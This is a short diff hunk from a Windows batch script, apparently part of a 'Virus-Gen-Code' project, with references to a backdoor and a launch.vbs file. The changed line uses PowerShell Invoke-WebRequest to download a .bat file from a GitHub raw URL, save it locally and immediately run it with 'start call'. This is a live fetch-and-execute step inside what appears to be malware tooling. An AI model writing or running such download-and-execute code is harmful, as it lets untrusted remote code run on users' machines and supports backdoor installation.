@@ -52,7 +52,7 @@ if exist "C:\Users\%username%\launch.vbs" goto backdoor_remove
   set /p opt2=directory:
 :: create all files needed
   :: create placeholder file
-    Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/progress%20bar.bat").Content >"progress bar.bat"
+    Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/progress_bar.bat").Content >"progress bar.bat"
     start call "progress bar.bat"
     timeout 1 >nul
     echo data>load_trigger.txt
